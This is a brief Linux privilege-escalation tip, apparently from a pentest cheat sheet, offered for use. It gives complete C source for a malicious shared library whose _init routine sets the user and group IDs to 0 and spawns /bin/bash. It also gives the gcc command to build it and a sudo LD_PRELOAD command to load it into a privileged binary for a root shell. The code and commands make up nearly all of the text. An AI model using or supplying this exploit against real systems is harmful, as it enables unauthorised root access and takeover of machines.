You can abuse LD_PRELOAD to become root if you can execute a binary with SUID-bit and gcc is installed. Open file and paste malicous C-code: cd /tmp
nano shell.c #include <stdio.h>
#include <sys/types.h>
#include <stdlib.h> void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
} Compile it as dynamic library and set <BINARY> to an executable with SUID: gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=$PWD/shell.so <BINARY> For more details, see Dynamic linker tricks: Using LD_PRELOAD to cheat, inject features and investigate programs
